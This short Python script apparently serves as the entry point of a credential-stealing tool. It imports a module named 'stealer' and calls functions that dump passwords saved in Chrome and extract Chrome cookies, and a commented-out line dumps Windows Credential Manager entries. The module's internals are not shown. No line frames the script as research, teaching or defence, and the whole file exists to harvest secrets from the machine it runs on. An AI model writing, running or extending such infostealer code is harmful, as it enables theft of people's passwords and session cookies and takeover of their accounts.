
import sys
import stealer

if __name__ == '__main__':

    credstealer = stealer.credentials
    cookiestealer = stealer.cookies
    #print(credstealer.dump_credsman_generic())
    credstealer.dump_chrome_passwords()
    cookiestealer.get_chrome_cookies()